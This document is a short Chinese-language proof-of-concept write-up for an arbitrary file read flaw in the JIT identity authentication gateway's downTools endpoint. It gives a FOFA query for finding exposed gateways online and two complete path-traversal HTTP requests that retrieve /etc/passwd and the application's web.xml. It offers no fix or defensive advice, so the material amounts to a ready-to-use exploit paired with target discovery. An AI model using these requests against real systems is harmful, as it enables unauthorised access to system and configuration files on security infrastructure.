# 吉大正元身份认证网关downtools存在任意文件读取漏洞

# 一、漏洞简介
 吉大正元身份认证网关是提供内部网络的接入控制以及对接入用户进行强身份认证和审计服务的产品，解决用户使用应用系统时涉及的身份验证、信息保密、权限控制等安全问题。吉大正元身份认证网关downtools存在任意文件读取漏洞。

# 二、影响版本
+ 吉大正元身份认证网关

# 三、资产测绘
+ fofa`title="吉大正元身份认证网关"`
+ 特征

![1729778241492-237326e1-b7f2-4329-9dec-df7fe40950e9.png](./img/XSH04fQGxTAZEfhK/1729778241492-237326e1-b7f2-4329-9dec-df7fe40950e9-065463.png)

# 四 、漏洞复现
```java
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```

![1729778389306-85ec46c0-c9fc-4e67-8427-ad027b4d4f80.png](./img/XSH04fQGxTAZEfhK/1729778389306-85ec46c0-c9fc-4e67-8427-ad027b4d4f80-870916.png)

```java
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../home/gateway/src/main/webapp/WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

![1729781375496-d3cb2e1b-69b0-4c2b-999e-ba4fb38cf9da.png](./img/XSH04fQGxTAZEfhK/1729781375496-d3cb2e1b-69b0-4c2b-999e-ba4fb38cf9da-716840.png)



> 更新: 2024-11-27 10:04:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ercgu609qmwqlr09>